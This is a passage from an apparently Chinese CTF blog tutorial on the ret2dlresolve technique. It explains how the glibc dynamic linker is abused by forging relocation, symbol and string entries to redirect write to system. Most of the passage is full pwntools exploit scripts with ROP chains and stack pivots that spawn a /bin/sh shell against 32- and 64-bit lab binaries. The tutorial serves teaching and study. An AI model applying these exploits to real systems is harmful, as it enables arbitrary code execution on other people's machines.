=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820155824511.png" alt="得到我们的/bin/sh\x00"></p><h4 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h4><p>我们这步控制好reloc_age的大小，然后使得reloc落在我们可以控制的.bss段，让其指向我们伪造的write重定位项，这样就可以控制道r_info</p><p>我们先查看我们我们文件的重定位表<code>readelf -r level3_partialrelro_32</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820165349463.png" alt="查看重定位表"></p><p>这样就可以找到我们write的r_info</p><p>剩下的就是将write的指针指向我们我们复制在.bss段的重定位项。更改一下我们之前的payload即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r_info=<span class="number">0x407</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=p32(write_got)</span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()x00</span><br></pre></td></tr></table></figure><p>成功输出了/bin/sh\x00</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820171854054.png" alt="同样得到我们的/bin/sh、x00"></p><h4 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h4><p>这一阶段我们控制我们之前控制好的r_info，使得write的Elf32_Sym落在我们的可控范围内</p><p>我知道我们的r_info分为两部分，32位下，第八位为重定位入口类型，高24位为重定位入口的符号在符号表的下标。</p><p>我们write的r_info是0x407，也就是偏移为4，重定位类型为7</p><p>这里我们要将write的Elf32_Sym到我们的.bss段上，而且要保证其16字节对齐</p><p>我们除了修改r_info之外还要复制一份write的Elf32_Sym。先查看一下其内容，由于之前我们得到其offset为4，那么我们可以通过查看整个symtab得到他</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820204830683.png" alt="获取write的Elf32_Sym"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(<span class="number">0x31</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="阶段四"><a href="#阶段四" class="headerlink" title="阶段四"></a>阶段四</h4><p>在上一阶段我们控制了Elf32_Sym，接下来就可以控制字符串表了，我们可以通过修改st_name来寻找到字符串表，将其放置在我们的.bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;write\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820211523106.png" alt="同样成功"></p><h4 id="阶段五"><a href="#阶段五" class="headerlink" title="阶段五"></a>阶段五</h4><p>既然我们已经控制了字符串表，剩下的就是将其修改掉即可，我们只要将write修改为system，还有将关于偏移和函数调用的参数全部修改即可将write劫持到system从而拿取shell。</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">5</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-<span class="number">8</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(<span class="number">0</span>)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">4</span>)</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO且需要泄露地址）"><a href="#64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO且需要泄露地址）" class="headerlink" title="64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO且需要泄露地址）"></a>64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO且需要泄露地址）</h3><p>在开始攻击之前我们要先来看看64位下一些结构体的变化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Addrr_offset;</span><br><span class="line">    Elf64_Xwordr_info;</span><br><span class="line">    Elf64_Sxwordr_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>这里相较于32位每个成员的大小变为了64位，即为8个字节，多了一个r_addend，一共为24个字节。Elf32_Rela 中是用r_addend 显式地指出加数;而对 Elf32_Rel来说,加数是隐含在被修改的位置里的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Wordst_name;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;                </span><br><span class="line">Elf64_Sectionst_shndx;                </span><br><span class="line">Elf64_Addrst_value;                </span><br><span class="line">Elf64_Xwordst_size;               </span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>其中st_name为32位，st_info和st_info各8位，st_shndx为16位，st_value和st_size各64位，一共为24个字节。</p><p>我们通过上面的分析知道64位有高概率会劫持失败，所以我们需要做一些额外的操作</p><p>还是之前的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到如果不进入这个判断语句就不会触发，也就是把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL。我们知道<strong>got表的第零项储存的是link_map</strong>,这样我们只需要泄露并修改掉 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 即可，而其偏移可以通过调试得到是0x1c8</p><p>剩下的和32差别不大，就不一一列举了，一次放在exp中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">link_map_got=<span class="number">0x404008</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=<span class="number">0x401156</span></span><br><span class="line">plt_0=<span class="number">0x401020</span></span><br><span class="line"></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<span class="comment">#64位中.rel.plt被称作.rela.plt</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_got)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(write_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">link_map_addr=u64(rv(io,<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;link_map_addr : &#x27;</span>+<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(pop_rbp_ret)<span class="comment">#栈劫持防止环境变量被破坏</span></span><br><span class="line">payload+=p64(fake_stack)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sla(io,<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_base_addr=fake_stack+<span class="number">0x100</span><span class="comment">#Elf64_Rela需要一块地址存放它</span></span><br><span class="line">fake_write_Elf64_Sym_base_addr=fake_stack+<span class="number">0x180</span><span class="comment">#Elf64_Sym需要一块地址存放它</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">0x200</span><span class="comment">#字符串的地址</span></span><br><span class="line">binsh_addr=fake_stack+<span class="number">0x208</span><span class="comment">#/bin/sh\x00的地址</span></span><br><span class="line"></span><br><span class="line">rel_plt_align=<span class="number">0x18</span>-(fake_write_Elf64_Rela_base_addr-rel_plt_addr)%<span class="number">0x18</span><span class="comment">#结构体的对齐填充字节，结构体大小为0x18</span></span><br><span class="line">rel_sym_align=<span class="number">0x18</span>-(fake_write_Elf64_Sym_base_addr-dynsym_addr)%<span class="number">0x18</span><span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_addr=fake_write_Elf64_Rela_base_addr+rel_plt_align<span class="comment">#Elf64_Rela地址</span></span><br><span class="line">fake_write_Elf64_Sym_addr=fake_write_Elf64_Sym_base_addr+rel_sym_align<span class="comment">#Elf64_Sym地址</span></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=(fake_write_Elf64_Rela_addr-rel_plt_addr)/<span class="number">0x18</span> <span class="comment">#伪造的reloc_arg</span></span><br><span class="line">fake_info=(((fake_write_Elf64_Sym_addr-dynsym_addr)/<span class="number">0x18</span>)&lt;&lt;<span class="number">0x20</span>)|<span class="number">0x7</span> <span class="comment">#伪造r_info，偏移要计算成下标，需要除以Elf64_Sym的大小且要保证最后一字节为0x7</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela =p64(write_got)</span><br><span class="line">fake_write_Elf64_Rela+=p64(fake_info)</span><br><span class="line">fake_write_Elf64_Rela+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Sym =p32(fake_st_name)</span><br><span class="line">fake_write_Elf64_Sym+=p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改写l_info[VERSYMIDX(DT_VERSYM)] </span></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_addr+<span class="number">0x1c8</span>)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(plt_0)</span><br><span class="line">payload+=p64(fake_write_reloc_age)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的重定位表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_plt_align</span><br><span class="line">payload+=fake_write_Elf64_Rela</span><br><span class="line">payload =payload.ljust(<span class="number">0x180</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的符号表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_sym_align</span><br><span class="line">payload+=fake_write_Elf64_Sym</span><br><span class="line">payload =payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的字符串</span></span><br><span class="line">payload+=<span class="string">&#x27;system\x00\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下伪造fake-link-map进行攻击（Partial-RELRO且无需泄露地址）"><a href="#64位下伪造fake-link-map进行攻击（Partial-RELRO且无需泄露地址）" class="headerlink" title="64位下伪造fake link_map进行攻击（Partial RELRO且无需泄露地址）"></a>64位下伪造fake link_map进行攻击（Partial RELRO且无需泄露地址）</h3><p>上面的攻击方式需要泄露地址，但可以泄露地址的话可能上面的攻击就会显得非常繁琐，没有必要，所以我们需要另一种攻击方式来达到我们的目的，我们之前的攻击思路还有一种没有使用，对link_map进行伪造进行攻击</p><p>我们再回看之前的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们没有太关注这里的else分支，DL_FIXUP_MAKE_VALUE函数是来寻找函数的真实地址，我们只要让**(sym-&gt;st_other)&amp;0x03 == 